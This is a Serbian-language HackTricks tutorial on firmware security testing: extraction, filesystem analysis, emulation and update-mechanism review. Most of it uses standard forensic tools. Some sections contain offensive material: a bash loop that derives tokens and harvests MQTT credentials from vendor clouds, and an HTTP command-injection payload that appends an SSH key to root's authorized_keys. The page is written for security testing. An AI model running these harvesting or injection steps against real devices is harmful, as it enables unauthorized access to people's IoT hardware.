# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmver je osnovni softver koji omogućava uređajima da funkcionišu ispravno tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici interaguju. Smešten je u trajnoj memoriji, što osigurava da uređaj ima pristup ključnim instrukcijama od trenutka uključivanja, što vodi ka pokretanju operativnog sistema. Ispitivanje i eventualna modifikacija firmvera su ključni koraci u otkrivanju sigurnosnih ranjivosti.

## **Prikupljanje informacija**

**Prikupljanje informacija** je kritični početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces uključuje prikupljanje podataka o:

- CPU arhitektura i operativni sistem koji koristi
- Specifičnosti bootloader-a
- Hardverski raspored i datasheet-ovi
- Metrike codebase-a i lokacije izvornog koda
- Eksterne biblioteke i tipovi licenci
- Istorija ažuriranja i regulatorne sertifikacije
- Arhitekturni dijagrami i dijagrami toka
- Procene bezbednosti i identifikovane ranjivosti

Za ove svrhe, **open-source intelligence (OSINT)** alati su neprocenjivi, kao i analiza dostupnih open-source softverskih komponenti kroz manuelne i automatizovane procese pregleda. Alati poput [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Dobijanje firmvera**

Dobijanje firmvera može se pristupiti na više načina, svaki sa različitim nivoom složenosti:

- **Direktno** od izvora (razvijači, proizvođači)
- **Sastavljanje** prema priloženim uputstvima
- **Preuzimanje** sa zvaničnih sajtova za podršku
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Pristupom direktno do **cloud storage** uz alate kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanje ažuriranja putem man-in-the-middle tehnika
- **Vađenje** sa uređaja preko konekcija kao što su **UART**, **JTAG** ili **PICit**
- **Sniffing** zahteva za ažuriranje u komunikaciji uređaja
- Identifikovanje i korišćenje **hardcoded update endpoints**
- **Dumping** iz bootloader-a ili preko mreže
- Uklanjanje i čitanje memorijskog čipa, kada sve drugo zakaže, koristeći odgovarajuće hardverske alate

## Analiza firmvera

Sada kada **imate firmver**, potrebno je izdvojiti informacije o njemu da biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako ne nađete mnogo pomoću tih alata, proverite **entropy** slike sa `binwalk -E <bin>`; ako je entropy nizak, verovatno nije šifrovano. Ako je entropy visok, verovatno je šifrovano (ili na neki način kompresovano).

Pored toga, možete koristiti ove alate za izdvajanje **fajlova ugrađenih u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled fajla.

### Dobijanje filesystem-a

Sa prethodno pomenutim alatima kao što je `binwalk -ev <bin>` trebalo bi da ste bili u mogućnosti da **izvučete filesystem**.\
Binwalk obično to izdvaja unutar **foldera nazvanog prema tipu filesystem-a**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje filesystem-a

Ponekad binwalk neće imati **magic byte** filesystem-a u svojim potpisima. U tim slučajevima, koristite binwalk da **pronađete offset filesystem-a i carve-ujete kompresovani filesystem** iz binarnog fajla i **ručno izdvojite** filesystem prema njegovom tipu koristeći korake ispod.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd command** za izdvajanje Squashfs datotečnog sistema.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatively, the following command could also be run.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware-a

Kada je firmware dobijen, važno ga je rastaviti kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces uključuje korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware slike.

### Početni alati za analizu

Naveden je skup komandi za početnu inspekciju binarnog fajla (označenog kao `<bin>`). Ove komande pomažu u identifikaciji tipova fajlova, izdavanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i fajlsistemima:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenio status enkripcije image-a, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za ekstrakciju **ugrađenih fajlova**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju fajlova.

### Ekstrakcija fajl-sistema

Korišćenjem `binwalk -ev <bin>`, obično se može izvaditi fajl-sistem, često u direktorijum nazvan po tipu fajl-sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip fajl-sistema zbog nedostajućih magic bajtova, neophodna je ručna ekstrakcija. To uključuje korišćenje `binwalk`-a za lociranje offset-a fajl-sistema, nakon čega sledi `dd` komanda za izdvajanje fajl-sistema:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa fajl-sistema (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza fajl-sistema

Kada je fajl-sistem izvađen, započinje potraga za bezbednosnim ranjivostima. Pažnja se poklanja nesigurnim mrežnim daemonima, hardkodiranim kredencijalima, API endpoint-ima, funkcionalnostima update servera, nekompajliranom kodu, startup skriptama i kompajliranim binarnim fajlovima za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati uključuju:

- **etc/shadow** and **etc/passwd** for user credentials
- SSL certificates and keys in **etc/ssl**
- Konfiguracioni fajlovi i skripte zbog potencijalnih ranjivosti
- Ugrađeni binarni fajlovi za dalju analizu
- Uobičajeni web serveri za IoT uređaje i binarni fajlovi

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl-sistema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Bezbednosne provere kompajliranih binarnih fajlova

I izvorni kod i kompajlirani binarni fajlovi pronađeni u fajl-sistemu moraju biti pažljivo ispitani na ranjivosti. Alati kao što su **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne pomažu u identifikaciji nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.

## Prikupljanje cloud konfiguracije i MQTT akredencijala putem izvedenih URL tokena

Mnogi IoT hubovi preuzimaju konfiguraciju po uređaju sa cloud endpoint-a koji izgleda ovako:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Tokom analize firmvera možete otkriti da je <token> izveden lokalno iz device ID-a koristeći hardkodirani secret, na primer:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Ovaj dizajn omogućava bilo kome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, često otkrivajući plaintext MQTT akredencijale i prefikse topic-a.

Praktičan tok rada:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju obrazac cloud config URL-a i adresu brokera, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Izdvoji STATIC_KEY i algoritam tokena iz firmvera

- Učitaj binarne fajlove u Ghidra/radare2 i potraži konfiguracionu putanju ("/pf/") ili upotrebu MD5.
- Potvrdi algoritam (npr., MD5(deviceId||STATIC_KEY)).
- Izvedi token u Bash-u i pretvori digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Sakupi cloud konfiguraciju i MQTT kredencijale

- Sastavi URL i povuci JSON sa curl; parsiraj sa jq da izvučeš tajne:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Iskoristite plaintext MQTT i slabe topic ACLs (ako postoje)

- Koristite recovered credentials da se pretplatite na maintenance topics i tražite sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Izlistajte predvidive device ID-ove (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bytes praćene sekvencijalnim sufiksom.
- Možete iterirati kandidat device ID-ove, izvesti tokens i programatski dohvatiti configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite eksplicitnu autorizaciju pre pokušaja mass enumeration.
- Kad god je moguće, preferirajte emulation ili static analysis kako biste oporavili tajne bez modifikovanja ciljnog hardvera.

Proces emulacije firmware omogućava **dynamic analysis** bilo rada uređaja bilo pojedinačnog programa. Ovakav pristup može naići na probleme zbog zavisnosti od hardvera ili architecture, ali prebacivanje root filesystem-a ili specifičnih binaries na uređaj sa istom architecture i endianness-om, kao što je Raspberry Pi, ili na pre-built virtual machine, može olakšati dalja testiranja.

### Emulacija pojedinačnih binaries

Za ispitivanje pojedinačnih programa, identifikacija endianness-a programa i CPU architecture je ključna.

#### Primer sa MIPS Architecture

Da biste emulirali MIPS architecture binary, možete koristiti komandu:
```bash
file ./squashfs-root/bin/busybox
```
I da instalirate neophodne alate za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian), `qemu-mips` se koristi, a za little-endian binarne fajlove, izbor bi bio `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne fajlove, proces je sličan — koristi se emulator `qemu-arm` za emulaciju.

### Potpuna emulacija sistema

Alati poput [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi olakšavaju potpunu emulaciju firmvera, automatizujući proces i pomažući u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi koristi se ili realno ili emulirano uređajno okruženje za analizu. Ključno je održavati shell pristup OS-u i filesystem-u. Emulacija možda neće savršeno oponašati hardverske interakcije, što zahteva povremena restartovanja emulacije. Analiza treba da ponovo pregleda filesystem, iskoristi izložene webpages i network servise, i istraži bootloader ranjivosti. Testovi integriteta firmvera su kritični za identifikaciju potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnim fajlom u njegovom izvršnom okruženju, koristeći alate kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-ova i identifikaciju ranjivosti kroz fuzzing i druge tehnike.

## Eksploatacija binarnih fajlova i Proof-of-Concept

Razvijanje PoC-a za identifikovane ranjivosti zahteva duboko razumevanje ciljne arhitekture i programiranje u nižerazrednim jezicima. Binary runtime zaštite u embedded sistemima su retke, ali kada postoje, tehnike poput Return Oriented Programming (ROP) mogu biti neophodne.

## Pripremljeni operativni sistemi za analizu firmvera

Operativni sistemi poput [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju pre-konfigurisana okruženja za testiranje bezbednosti firmvera, opremljena neophodnim alatima.

## Pripremljeni OS-ovi za analizu firmvera

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da pomogne pri security assessment i pentestingu Internet of Things (IoT) uređaja. Štedi vreme pružajući prekonfigurisano okruženje sa svim neophodnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti embedded uređaja zasnovan na Ubuntu 18.04, unapred opremljen alatima za testiranje bezbednosti firmvera.

## Napadi downgrade-a firmvera & nesigurni mehanizmi ažuriranja

Čak i kada proizvođač implementira kriptografske provere potpisa za images firmvera, **zaštita protiv rollback-a verzije (downgrade) se često izostavlja**. Kada boot- ili recovery-loader samo verifikuje potpis ugrađenim javnim ključem, ali ne upoređuje *verziju* (ili monotoni brojač) image-a koji se flešuje, napadač može legitimno instalirati **stariji, ranjiv firmver koji i dalje nosi validan potpis** i tako ponovo uvesti ranjivosti koje su prethodno ispravljene.

Tipičan tok napada:

1. **Obtain an older signed image**
* Preuzmi ga sa javnog download portala proizvođača, CDN-a ili support sajta.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih server-side i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristi ranjivost koja je popravljena u novijem izdanju (na primer command-injection filter koji je dodat kasnije).
4. Opcionalno flešuj najnoviji image nazad ili onemogući update-e da bi se izbegla detekcija nakon što se postigne persistence.

### Primer: Command Injection nakon downgrade-a
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivoj (downgraded) firmware verziji, parametar `md5` se konkatenira direktno u shell komandu bez sanitizacije, što omogućava injektovanje proizvoljnih komandi (ovde – omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter karaktera, ali izostanak zaštite od downgrade-a čini popravku bezvrednom.

### Vađenje firmware-a iz mobilnih aplikacija

Mnogi proizvođači ubacuju pune firmware image-e u njihove prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi-Fi. Ovi paketi se obično čuvaju nekriptovani u APK/APEX pod putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra`, ili čak običan `unzip` omogućavaju vam da izvučete potpisane slike bez diranja fizičkog hardvera.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolna lista za procenu logike ažuriranja

* Da li su prenos i autentikacija *update endpoint*-a adekvatno zaštićeni (TLS + authentication)?
* Da li uređaj upoređuje **brojeve verzija** ili **monotoni anti-rollback brojač** pre flashing-a?
* Da li se image verifikuje unutar secure boot lanca (npr. potpisi provereni od strane ROM koda)?
* Da li userland kod izvodi dodatne provere ispravnosti (npr. dozvoljena mapa particija, model uređaja)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu validacionu logiku?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranljivi firmware projekti za vežbanje

Za vežbu otkrivanja ranjivosti u firmware-u, koristite sledeće ranjive firmware projekte kao polaznu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Reference

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Obuka i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
